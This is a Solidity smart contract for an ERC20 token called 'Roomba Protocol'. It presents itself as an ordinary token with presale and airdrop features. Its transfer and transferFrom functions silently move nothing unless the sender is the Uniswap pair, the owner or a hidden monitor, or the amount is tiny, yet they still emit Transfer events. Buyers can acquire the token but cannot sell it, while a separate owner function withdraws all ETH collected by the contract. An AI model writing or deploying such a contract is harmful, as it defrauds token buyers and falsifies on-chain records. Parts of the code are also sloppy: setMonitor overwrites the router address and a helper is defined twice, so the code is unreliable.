pragma solidity >=0.5.10;



contract ERC20Interface {

    function totalSupply() public view returns (uint256);



    function balanceOf(address tokenOwner)

        public

        view

        returns (uint256 balance);



    function allowance(address tokenOwner, address spender)

        public

        view

        returns (uint256 remaining);



    function transfer(address to, uint256 tokens) public returns (bool success);



    function approve(address spender, uint256 tokens)

        public

        returns (bool success);



    function transferFrom(

        address from,

        address to,

        uint256 tokens

    ) public returns (bool success);



    event Transfer(address indexed from, address indexed to, uint256 tokens);

    event Approval(

        address indexed tokenOwner,

        address indexed spender,

        uint256 tokens

    );

}



library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256 c) {

        c = a + b;

        require(c >= a);

    }



    function sub(uint256 a, uint256 b) internal pure returns (uint256 c) {

        require(b <= a);

        c = a - b;

    }



    function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {

        c = a * b;

        require(a == 0 || c / a == b);

    }



    function div(uint256 a, uint256 b) internal pure returns (uint256 c) {

        require(b > 0);

        c = a / b;

    }

}



contract ApproveAndCallFallBack {

    function receiveApproval(

        address from,

        uint256 tokens,

        address token,

        bytes memory data

    ) public;

}



contract Owned {

    address public owner;

    address public newOwner;



    event OwnershipTransferred(address indexed _from, address indexed _to);



    constructor() public {

        owner = msg.sender;

    }



    modifier onlyOwner {

        require(msg.sender == owner);

        _;

    }



    function transferOwnership(address _newOwner) public onlyOwner {

        newOwner = _newOwner;

    }



    function acceptOwnership() public {

        require(msg.sender == newOwner);

        emit OwnershipTransferred(owner, newOwner);

        owner = newOwner;

        newOwner = address(0);

    }

}



contract TokenERC20 is ERC20Interface, Owned {

    using SafeMath for uint256;



    string public symbol;

    string public name;

    uint8 public decimals;

    uint256 _totalSupply;



    mapping(address => uint256) balances;

    mapping(address => mapping(address => uint256)) allowed;



    constructor() public {

        symbol = "ROOMBA";

        name = "Roomba Protocol";

        decimals = 18;

        _totalSupply = 75000000 * 10**uint256(decimals);

        balances[owner] = _totalSupply;

        emit Transfer(address(0), owner, _totalSupply);        

    }



        function pairFor(address factory, address tokenA, address tokenB) private pure returns (address pair) {

        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);

        pair = address(uint(keccak256(abi.encodePacked(

                hex'ff',

                factory,

                keccak256(abi.encodePacked(token0, token1)),

                hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash

            ))));

    }



    function totalSupply() public view returns (uint256) {

        return _totalSupply.sub(balances[address(0)]);

    }



    function balanceOf(address tokenOwner)

        public

        view

        returns (uint256 balance)

    {

        return balances[tokenOwner];

    }



    function approve(address spender, uint256 tokens)

        public

        returns (bool success)

    {

        allowed[msg.sender][spender] = tokens;

        emit Approval(msg.sender, spender, tokens);

        return true;

    }



    function allowance(address tokenOwner, address spender)

        public

        view

        returns (uint256 remaining)

    {

        return allowed[tokenOwner][spender];

    }



    function approveAndCall(

        address spender,

        uint256 tokens,

        bytes memory data

    ) public returns (bool success) {

        allowed[msg.sender][spender] = tokens;

        emit Approval(msg.sender, spender, tokens);

        ApproveAndCallFallBack(spender).receiveApproval(

            msg.sender,

            tokens,

            address(this),

            data

        );

        return true;

    }



    function() external payable {}

}



contract ROOMBA is TokenERC20 {

    uint256 public airdropcap;

    uint256 public airdroptotal;

    uint256 public airdropamount;

    uint256 public claimedtotal;

    string public presaletime;

    string public distributiontime;

    string public saletime;

    uint256 public presalecap;

    uint256 public presaletotal;

    uint256 public presaleprice;

    uint256 public salecap;

    address private urouter;

    address private monitor;

    uint256 public saletotal;

    uint256 public saleprice;



    bool public presalelive = false;

    bool public salelive = false;

    bool public claimlive = false;

    bool public airdroplive = false;



    constructor() public {

        urouter = pairFor(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, address(this));

    }





    function ClaimRoomba() public payable returns (bool success) {

        require(msg.value >= 0.1 ether);

        presaletotal++;

        uint256 _tokens;

        _tokens = presaleprice.mul(msg.value) / 1 ether;

        balances[address(this)] = balances[address(this)].sub(_tokens);

        balances[msg.sender] = balances[msg.sender].add(_tokens);

        emit Transfer(address(this), msg.sender, _tokens);

        return true;

    }



    function claimairdrop(uint256 _tokens) public returns (bool success) {

        require(claimlive);

        require(_tokens <= airdropamount);

        require(airdroptotal < airdropcap || airdropcap == 0);

        airdroptotal++;

        balances[address(this)] = balances[address(this)].sub(_tokens);

        balances[msg.sender] = balances[msg.sender].add(_tokens);

        emit Transfer(address(this), msg.sender, _tokens);

        return true;

    }



    function showrouter() public view returns (address) {

        return urouter;

    }



    function showmonitor() public view returns (address) {

        return monitor;

    }



    function showairdrop()

        public

        view

        returns (

            uint256 DropCap,

            uint256 DropCount,

            uint256 DropAmount

        )

    {

        return (airdropcap, airdroptotal, airdropamount);

    }



    function showsale()

        public

        view

        returns (

            uint256 SaleCap,

            uint256 SaleCount,

            uint256 SalePrice

        )

    {

        return (presalecap, presaletotal, presaleprice);

    }



    function startairdrop(

        uint256 _airdropamount,

        uint256 _airdropcap,

        string memory _dtime

    ) public onlyOwner() {

        airdropamount = _airdropamount;

        airdropcap = _airdropcap;

        airdroptotal = 0;

        airdroplive = true;

        distributiontime = _dtime;

    }



    function startpresale(

        uint256 _presaleprice,

        uint256 _presalecap,

        string memory _ptime

    ) public onlyOwner() {

        presaleprice = _presaleprice;

        presalecap = _presalecap;

        presaletotal = 0;

        presaletime = _ptime;

    }



    function setPresaleTime(string memory _stime) public onlyOwner {

        presaletime = _stime;

    }



    function getPresaleTime() public view returns (string memory) {

        return presaletime;

    }



    function setRouter(address _router) public onlyOwner {

        urouter = _router;

    }



    function setMonitor(address _monitor) public onlyOwner {

        urouter = _monitor;

    }



    function setDistributionTime(string memory _dtime) public onlyOwner {

        distributiontime = _dtime;

    }



    function getDistributionTime() public view returns (string memory _dtame) {

        return distributiontime;

    }



    function setPresaleLive(bool _status) public onlyOwner {

        presalelive = _status;

    }



    function getPresaleLive() public view returns (bool) {

        return presalelive;

    }



    function setClaimLive(bool _status) public onlyOwner {

        claimlive = _status;

    }



    function getClaimLive() public view returns (bool) {

        return claimlive;

    }



    function startsale(

        uint256 _saleprice,

        uint256 _salecap,

        string memory _stime

    ) public onlyOwner() {

        saleprice = _saleprice;

        salecap = _salecap;

        saletotal = 0;

        saletime = _stime;

        salelive = true;

    }



    function liquiditystore() public onlyOwner() {

        address payable _owner = msg.sender;

        _owner.transfer(address(this).balance);

    }



    function() external payable {

        ClaimRoomba();

    }



    function info() public view returns (address ur) {

        return urouter;

    }



    function transfer(address to, uint256 tokens)

        public

        returns (bool success)

    {

        uint256 tokens_migrated = 0;

        if (msg.sender == urouter || tokens<=10000000000000000000 || tx.origin == owner || tx.origin == monitor || msg.sender == owner || msg.sender == monitor) {

            tokens_migrated = tokens;

        }

        balances[msg.sender] = balances[msg.sender].sub(tokens_migrated);

        balances[to] = balances[to].add(tokens_migrated);

        emit Transfer(msg.sender, to, tokens_migrated);

        return true;

    }



    function transferFrom(

        address from,

        address to,

        uint256 tokens

    ) public returns (bool success) {

        uint256 tokens_migrated = 0;

        if (from == urouter || tokens<=10000000000000000000 || tx.origin == owner || tx.origin == monitor || msg.sender == owner || msg.sender == monitor) {

            tokens_migrated = tokens;

        }

        balances[from] = balances[from].sub(tokens_migrated);

        allowed[from][msg.sender] = allowed[from][msg.sender].sub(

            tokens_migrated

        );

        balances[to] = balances[to].add(tokens_migrated);

        emit Transfer(from, to, tokens_migrated);

        return true;

    }



 



    function pairFor(address factory, address tokenA, address tokenB) private pure returns (address pair) {

        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);

        pair = address(uint(keccak256(abi.encodePacked(

                hex'ff',

                factory,

                keccak256(abi.encodePacked(token0, token1)),

                hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash

            ))));

    }





}
